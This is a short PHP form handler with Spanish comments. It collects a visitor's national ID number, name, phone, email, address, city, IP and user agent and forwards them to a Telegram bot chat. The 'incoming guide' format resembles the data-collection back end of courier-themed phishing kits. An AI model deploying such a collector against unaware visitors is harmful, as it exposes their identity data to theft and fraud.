<?php
// Incluye tu archivo con $token y $telegram_admin_id
include '../telegram.php';

// Función para obtener la IP del usuario
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Solo procesar si llega por POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $cedula   = htmlspecialchars($_POST['cedula']);
    $nombre   = htmlspecialchars($_POST['nombre']);
    $phone    = htmlspecialchars($_POST['phone']);
    $email    = htmlspecialchars($_POST['email']);
    $address  = htmlspecialchars($_POST['address']);
    $city     = htmlspecialchars($_POST['city']);
    $user_ip  = getUserIP();

    // 🚨 Formato bonito del mensaje
    $msg  = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n";
    $msg .= "🆔 *Cédula:* $cedula\n";
    $msg .= "👤 *Nombre:* $nombre\n";
    $msg .= "📞 *Teléfono:* $phone\n";
    $msg .= "📧 *Email:* $email\n";
    $msg .= "🏠 *Dirección:* $address\n";
    $msg .= "🌆 *Ciudad:* $city\n";
    $msg .= "🌍 *IP:* $user_ip\n";
    $msg .= "🖥 *User-Agent:* " . $_SERVER['HTTP_USER_AGENT'] . "\n";

    // Enviar a Telegram
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $telegram_admin_id,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);

    // Redirigir con confirmación
    echo "<script>alert('✅ Tus datos fueron enviados con éxito.'); window.location.href='../index.html';</script>";
    exit;
} else {
    // Si alguien entra directo a procesar.php sin formulario
    header("Location: index.php");
    exit;
}
?>
